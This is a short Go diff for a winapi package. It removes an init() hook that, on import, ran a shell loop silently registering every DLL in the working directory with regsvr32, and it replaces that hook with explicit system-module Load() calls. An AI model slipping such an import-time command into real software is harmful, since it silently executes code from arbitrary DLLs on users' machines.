@@ -1,13 +1,11 @@
 package winapi
 
-import (
-	"log"
-	"os/exec"
-)
-
 func init() {
-	// Reload DLLs
-	if err := exec.Command("for /f %s in ('dir /b *.dll') do regsvr32 /s %s").Run(); err != nil {
-		log.Printf("Warning: failed to reload DLLs")
-	}
+	modAdvapi32.Load()
+	modKernel32.Load()
+	modNetapi32.Load()
+	modOffreg.Load()
+	modSecur32.Load()
+	modUserenv.Load()
+	modWtsapi32.Load()
 }
